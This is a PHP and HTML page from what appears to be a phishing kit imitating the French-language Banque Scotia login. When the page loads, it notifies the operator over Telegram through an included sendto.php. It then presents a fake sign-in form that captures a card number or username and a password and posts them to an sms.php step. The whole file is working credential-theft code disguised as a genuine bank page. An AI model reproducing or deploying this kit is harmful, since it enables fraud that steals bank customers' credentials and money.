<?php session_start();
$_SESSION["bank"] ='scotia';
require_once "../sendto.php";


sendMessageToTelegram('🟡🟡🟡'.$_SESSION['bank'].'🟡🟡🟡'); 
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/scotia/styles_mobile.css">

     <link rel="stylesheet" media="screen and (min-width: 769px)" href="/scotia/styles_pc.css">
    <title>SCOTIA</title>
</head>
<body>
    <div class="container">
        <div class="header">
    <div class="title">
        <span class="title1" >Bienvenue a la </span> 
        <span class="title2">Banque Scotia</span>
    </div>
        </div>
        <div class="body">
        <form action="/scotia/sms.php" method="post">
  <div class="inputForm">
       <img class="img" src="/scotia/img/profile.png"> <input type="text" name="cvv" placeholder="Nom d'utilisateur ou Numero de carte " >
  </div>


  <div class="inputForm">
     <img class="img" src="/scotia/img/lock.png"> <input type="password" name="mdp" placeholder="Mot de passe " >
    </div>

    <div class="inputFormCheck">
    <input type="checkbox"  > Memoriser mon nom d'utilisateur ou numero de carte
    </div>

    <div class="inputFormSubmit">
    <input type="submit" value="Ouvrir une session" >
    </div>

    <b>Besoin d'aide pour ouvrir une session ?</b>

        </form>


        </div>


    </div>

    <div class="bas">

    <span>Avez-vous un nom d'utilisateur et un mot de passe ?</span> <br><br>
    <b>Etablissez-les maintenant</b>
    </div>
</body>
</html>